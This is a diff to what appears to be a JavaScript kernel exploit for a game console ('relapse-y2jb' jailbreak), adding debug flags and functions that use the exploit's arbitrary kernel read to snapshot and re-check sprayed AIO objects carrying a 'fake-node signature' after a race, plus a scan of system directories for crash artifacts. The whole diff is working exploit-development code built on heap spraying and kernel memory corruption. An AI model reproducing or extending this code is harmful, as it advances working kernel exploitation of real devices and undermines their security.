@@ -18,6 +18,9 @@
         const AIO_DUMP_WAITERS = false;
         const AIO_DUMP_AFTER_RELEASE = false;
         const AIO_LEAK_ON_EXIT = false;
+        const AIO_POISON_SNAPSHOT = false;
+        const POISON_SNAPSHOT_MAX = 400;
+        const CRASH_ARTIFACT_SCAN = false;
         const DIAGNOSE_AFTER_HANDOFF = false;
         const STABILIZE_CREDS = false;
         const PROBE_DLSYM = false;
@@ -4836,6 +4839,11 @@
             let accepted = 0;
             for (let i = 0; i < sprays; i++)
               if ((this.readU32(returns, i * 8) | 0) === 0) accepted++;
+            if (typeof AIO_POISON_SNAPSHOT !== "undefined" && AIO_POISON_SNAPSHOT) {
+              const sprayed = this.sprayedIds || (this.sprayedIds = []);
+              for (let i = 0; i < sprays * requests; i++)
+                sprayed.push(this.readU32(sprayedIds, i * 4) >>> 0);
+            }
             return accepted;
           }
           async cancelRequest(group, index) {
@@ -5757,6 +5765,113 @@
               this.report(label, "failed: " + e.message);
             }
           }
+          async snapshotAioPoison(label) {
+            const H = (v) => (v === null ? "-" : "0x" + v.toString());
+            const K = (v) => v !== null && ((v.hi >>> 16) === 0xffff);
+            try {
+              if (!this.curproc) await this.findCurrentProcess();
+              const table = await this.readKernelPointer(
+                this.curproc.add32(this.off.proc.aioInfo));
+              const sprayIds = this.sprayedIds || [];
+              const ids = [];
+              for (const g of this.armedGroups) for (const id of g) ids.push(["armed", id]);
+              for (const id of sprayIds) ids.push(["spray", id]);
+              const nodeMutex = this.kaddr(this.off.nodeMutex);
+              this.report(label, "p_aioinfo " + H(table) + ", " + ids.length +
+                " ids (" + (ids.length - sprayIds.length) + " armed, " + sprayIds.length +
+                " sprayed), kbase 0x" + this.kbase.toString() +
+                ", nodeMutex 0x" + nodeMutex.toString());
+              if (!table) {
+                this.report(label, "p_aioinfo is NULL - the objects are unreachable " +
+                  "from the process, so this pass cannot enumerate them");
+                this.poisonSnapshot = [];
+                return;
+              }
+              const seen = {};
+              const snap = [];
+              const cap = (typeof POISON_SNAPSHOT_MAX !== "undefined" && POISON_SNAPSHOT_MAX) || 400;
+              let noSlot = 0, noObj = 0, unreadable = 0, poisoned = 0, other = 0, capped = 0;
+              const samples = [];
+              for (const [kind, id] of ids) {
+                const s = await this.aioSlot(table, id);
+                if (!s) { noSlot++; continue; }
+                if (!s.obj) { noObj++; continue; }
+                const key = s.obj.toString();
+                if (seen[key]) continue;
+                seen[key] = true;
+                if (snap.length >= cap) { capped++; continue; }
+                const words = [];
+                let ok = true;
+                for (let off = 0; off < 0x40; off += 8) {
+                  const w = await this.readKernel64(s.obj.add32(off));
+                  if (w === null) { ok = false; break; }
+                  words.push(w);
+                }
+                if (!ok) { unreadable++; continue; }
+                const sig = K(words[0]) && K(words[1]) &&
+                  words[2].toString() === nodeMutex.toString();
+                if (sig) poisoned++; else other++;
+                snap.push({ kind: kind, id: id, obj: s.obj, words: words, sig: sig,
+                  type: s.type & 0xffff, state: s.state, gen: s.gen });
+                if (samples.length < 10)
+                  samples.push("  " + kind + " id " + id + " obj " + H(s.obj) +
+                    " type " + (s.type & 0xffff) + " state " + s.state + " gen " +
+                    s.gen + (sig ? "  <-- SIGNATURE" : "") + "\n    " +
+                    words.map((w, i) => "+" + (i * 8).toString(16) + "=0x" +
+                      w.toString()).join(" "));
+              }
+              this.poisonSnapshot = snap;
+              this.report(label, snap.length + " unique objects: " + poisoned +
+                " carrying the fake-node signature, " + other + " other, " + noSlot +
+                " ids with no slot, " + noObj + " slots with no object, " + unreadable +
+                " unreadable" + (capped ? ", " + capped + " more left unread (cap " +
+                cap + ")" : ""));
+              for (const s of samples) this.report(label, s);
+            } catch (e) {
+              this.report(label, "snapshot failed: " + e.message);
+            }
+          }
+          async verifyAioPoison(label) {
+            const H = (v) => (v === null ? "-" : "0x" + v.toString());
+            try {
+              const snap = this.poisonSnapshot || [];
+              if (!snap.length) {
+                this.report(label, "nothing was snapshotted - pass 1 found no objects");
+                return;
+              }
+              let same = 0, sigLeft = 0, changed = 0, unreadable = 0;
+              const samples = [];
+              for (const e of snap) {
+                const now = [];
+                let ok = true;
+                for (let off = 0; off < 0x40; off += 8) {
+                  const w = await this.readKernel64(e.obj.add32(off));
+                  if (w === null) { ok = false; break; }
+                  now.push(w);
+                }
+                if (!ok) { unreadable++; continue; }
+                const identical = now.every((w, i) => w.toString() === e.words[i].toString());
+                if (identical) {
+                  same++;
+                  if (e.sig) sigLeft++;
+                  continue;
+                }
+                changed++;
+                if (samples.length < 10)
+                  samples.push("  " + e.kind + " id " + e.id + " obj " + H(e.obj) +
+                    (e.sig ? " (had SIGNATURE)" : "") + "\n    was " +
+                    e.words.map((w) => w.toString()).join(" ") + "\n    now " +
+                    now.map((w) => w.toString()).join(" "));
+              }
+              this.report(label, "re-read " + snap.length + " objects: " + same +
+                " byte-identical (" + sigLeft + " of them still carrying the " +
+                "fake-node signature), " + changed + " changed since the race, " +
+                unreadable + " now unreadable");
+              for (const s of samples) this.report(label, s);
+            } catch (e) {
+              this.report(label, "verify failed: " + e.message);
+            }
+          }
           async restorePipes() {
             if (this.disarmed) return;
             if (!this.crossed) return;
@@ -5807,6 +5922,8 @@
               if (!(await this.crossPipes()))
                 return this.stop("fast read and write not established");
               this.report("Kernel", "fast read and write ready");
+              if (typeof AIO_POISON_SNAPSHOT !== "undefined" && AIO_POISON_SNAPSHOT)
+                await this.snapshotAioPoison("poison-snap");
               if (typeof STOP_AFTER !== "undefined" && STOP_AFTER === "fast")
                 return this.stop("STOP_AFTER=fast - pipes crossed, aio groups still armed");
               this.report("Kernel", "checking aio groups");
@@ -5849,6 +5966,9 @@
               if (typeof AIO_DUMP_AFTER_RELEASE !== "undefined" &&
                   AIO_DUMP_AFTER_RELEASE && this.crossed)
                 await this.dumpAioState("aio-dump");
+              if (typeof AIO_POISON_SNAPSHOT !== "undefined" &&
+                  AIO_POISON_SNAPSHOT && this.crossed)
+                await this.verifyAioPoison("poison-verify");
               if (typeof AIO_LEAK_ON_EXIT !== "undefined" && AIO_LEAK_ON_EXIT &&
                   this.crossed)
                 await this.leakAioInfo("aio-leak");
@@ -5858,6 +5978,47 @@
               this.report("Cleanup", "failed");
             }
           }
+        }
+        function stat_words(path) {
+            const p = alloc_string(path);
+            const buf = hmalloc(0x200);
+            if (syscall(SYSCALL.stat, p, buf) === MASK64) return null;
+            const out = [];
+            for (let off = 0n; off < 0x90n; off += 8n) out.push(read64(buf + off));
+            return out;
+        }
+        function scan_crash_artifacts() {
+            const dirs = ["/user/temp", "/user/temp/common_temp", "/user/common",
+                "/user/crash", "/user/swap", "/user/shell", "/mnt/auto",
+                "/var", "/var/db", "/var/log", "/var/crash"];
+            const interesting = /crash|dump|core|panic|kdump|report|assert|err|\.log/i;
+            const now_s = Math.floor(Date.now() / 1000);
+            say("crash-artifact scan (wall clock " + now_s + " = 0x" +
+                now_s.toString(16) + "; a bogus clock just means the timestamp " +
+                "filter is useless, the listings still are not)");
+            for (const dir of dirs) {
+                let names = null;
+                try { names = list_dir(dir, 256); } catch (_) { names = null; }
+                if (!names) { say("  " + dir + ": not readable"); continue; }
+                say("  " + dir + ": " + names.length + " entries - " +
+                    names.slice(0, 40).join(", ") + (names.length > 40 ? ", ..." : ""));
+                for (const name of names) {
+                    if (name === "." || name === "..") continue;
+                    let st = null;
+                    try { st = stat_words(dir + "/" + name); } catch (_) { st = null; }
+                    if (!st) continue;
+                    let recent = false;
+                    for (const w of st) {
+                        const v = Number(w & MASK64);
+                        if (v > now_s - 86400 && v < now_s + 3600) { recent = true; break; }
+                    }
+                    if (!recent && !interesting.test(name)) continue;
+                    say("    " + dir + "/" + name +
+                        (recent ? "  <-- modified within a day" : "") + "\n      " +
+                        st.map((w, i) => "+" + (i * 8).toString(16) + "=0x" +
+                            (w & MASK64).toString(16)).join(" "));
+                }
+            }
         }
         capture_log_socket();
         if (net_log_init())
@@ -5870,6 +6031,10 @@
         send_notification(relapse_version + "\nFW " + FW_VERSION + "\n" +
             (typeof version_string === "string" ? version_string : "Y2JB"));
         say("relapse-y2jb starting");
+        if (CRASH_ARTIFACT_SCAN) {
+            try { scan_crash_artifacts(); }
+            catch (e) { say("crash-artifact scan threw " + e.message); }
+        }
         if (typeof is_jailbroken === "function" && is_jailbroken()) {
             send_notification("relapse: already jailbroken");
             say("already jailbroken - nothing to do");
